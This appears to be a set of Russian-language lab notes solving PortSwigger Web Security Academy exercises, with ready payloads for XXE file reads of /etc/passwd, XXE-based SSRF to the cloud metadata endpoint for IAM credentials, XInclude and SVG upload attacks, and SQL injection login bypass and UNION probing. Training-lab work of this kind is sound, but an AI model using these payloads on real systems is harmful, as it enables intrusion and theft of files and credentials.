1. https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
1)зайти на сайт, 

2)выбрать продукт, 

3)нажать *Check stock*, 

4)перехватить Post запрос через BURP 

5) после объявления xml добавить

' <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> '

6)заменить product id число на &res; 

7)после этого просто отправить запрос и в ответе придёт /etc/passwd

2. https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
те же действия, что и в предыдущей. до пункта 4) 
5)после объявления xml добавить:
'<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>'
6)заменить product id на &res; отправить запрос, 
7)в ответе придет latest - добавить его к адресу и получим 
'<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 'и так далее, 
n+1)в итоге получаем '<!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>', что и приведёт нас к ответу.

3. https://portswigger.net/web-security/xxe/lab-xinclude-attack
те же действия, что и в 1. до пункта 4) 
5)в *product id* вставить '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> '''
6)в ответ придёт /etc/passwd

4.
1) 2) выбрать статью 
3)нажать отправить комментариq(заполнить все поля предварительно) 
4)перехватить запрос через Burp
5)в поле для картинки вставить: 
'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/hostname"> ]>
 <svg  version="1.1" width="1200" height="1200"
        viewBox="0 0 100 100"
     baseProfile="full"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:ev="http://www.w3.org/2001/xml-events">
 <text font-size = "10" y = "16"> &res; </text>
</svg>'''
svg части взяты из интернета - видимо что-то типа стандарта,размер задан вручную, ViewBox регулировался так, чтоб было видно текст на картинке, собственно как и размер текста(тоже регулировался)


1. https://portswigger.net/web-security/sql-injection/lab-login-bypass
1) в графе login ввести administrator'--
2.https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 
1)в category использовать '+union+select+NULL,NULL,NULL - так убедимся, что у нас 3 столбца в таблице
2)заменяем NULL по очереди на 'HmnfQ2' - дано в задании
https://ac811f101ea3312280cb0ad600a4009a.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27HmnfQ2%27,NULL-- 
3)второй столбец оказался верным - выводится результат